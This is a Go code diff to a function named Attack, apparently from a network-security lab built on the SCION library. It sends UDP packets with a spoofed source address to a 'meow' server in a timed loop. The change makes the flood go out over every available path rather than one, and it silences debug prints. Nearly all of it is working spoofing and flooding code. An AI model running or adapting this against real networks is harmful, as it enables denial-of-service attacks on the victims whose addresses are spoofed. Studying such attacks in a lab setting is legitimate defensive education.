@@ -8,7 +8,6 @@ import (
 	// "net"
 	// "sync" // TODO uncomment any imports you need (go optimizes away unused imports)
 	"context"
-	"fmt"
 	"log"
 	"net"
 	"time"
@@ -39,7 +38,7 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 
 	// Context
 	meow_addr, err := snet.ParseUDPAddr(meowServerAddr)
-	fmt.Printf("fdfdf: %s\n", meowServerAddr)
+	// fmt.Printf("fdfdf: %s\n", meowServerAddr)
 	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
 	defer cancel()
 
@@ -63,14 +62,14 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	}
 	ia, err := sciondConn.LocalIA(ctx)
 	// ia.A = 281105609527573
-	fmt.Println("SEP0")
+	// fmt.Println("SEP0")
 	var a []snet.Path
 	a, err = sciondConn.Paths(ctx, spoofedAddr.IA, meow_addr.IA, daemon.PathReqFlags{})
-	fmt.Println(a)
-	fmt.Println(sciondConn.ASInfo(ctx, spoofedAddr.IA))
-	fmt.Println("SEP")
+	// fmt.Println(a)
+	// fmt.Println(sciondConn.ASInfo(ctx, spoofedAddr.IA))
+	// fmt.Println("SEP")
 	netnet := snet.NewNetwork(ia, dispatcher, nil)
-	fmt.Println(spoofedAddr.Host)
+	// fmt.Println(spoofedAddr.Host)
 	// spoofedAddr.Host.Port = 8011
 	// spoofedAddr.Host =
 	// conn, err := netnet.Dial(ctx, "udp", spoofedAddr.Host, meow_addr, addr.SvcNone)
@@ -91,25 +90,29 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	}
 	// path = a[0].Path().Reverse()
 	// path = a[len(a)-1].Path()
-	spoofedAddr.Path = a[0].Path()
-	spoofedAddr.Path.Reverse()
-	path = spoofedAddr.Path
 	// payload = []byte{0}
-	
+
 	// var p *spath.Path = &(a[0].Path())
-	pkt := &snet.Packet{
-		Bytes: snet.Bytes(make([]byte, common.SupportedMTU)),
-		PacketInfo: snet.PacketInfo{
-			Destination: dst,
-			Source: snet.SCIONAddress{IA: spoofedAddr.IA,
-				Host: addr.HostFromIP(spoofedAddr.Host.IP)},
-			Path: path,
-			Payload: snet.UDPPayload{
-				SrcPort: uint16(spoofedAddr.Host.Port),
-				DstPort: uint16(port),
-				Payload: payload,
+	pkts := []*snet.Packet{}
+	for i := 0; i < len(a); i++ {
+		spoofedAddr.Path = a[i].Path()
+		spoofedAddr.Path.Reverse()
+		path = spoofedAddr.Path
+		pkt := &snet.Packet{
+			Bytes: snet.Bytes(make([]byte, common.SupportedMTU)),
+			PacketInfo: snet.PacketInfo{
+				Destination: dst,
+				Source: snet.SCIONAddress{IA: spoofedAddr.IA,
+					Host: addr.HostFromIP(spoofedAddr.Host.IP)},
+				Path: path,
+				Payload: snet.UDPPayload{
+					SrcPort: uint16(spoofedAddr.Host.Port),
+					DstPort: uint16(port),
+					Payload: payload,
+				},
 			},
-		},
+		}
+		pkts = append(pkts, pkt)
 	}
 
 	// conn.mtx.Lock()
@@ -125,12 +128,13 @@ func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAdd
 	// ret, err := conn.Write(payload)
 	// fmt.Println(ret)
 	// fmt.Println(err)
-	// payload = []byte{0}
 	// *conn.scionConnWriter = 281105609527573
 	// conn.Write(payload)
 
 	for start := time.Now(); time.Since(start) < AttackDuration(); {
-		packetConn.WriteTo(pkt, nextHop)
+		for i := 0; i < len(pkts); i++ {
+			packetConn.WriteTo(pkts[i], nextHop)
+		}
 		// conn.Write(payload)
 		// fmt.Println(ret)
 		// fmt.Println(err)
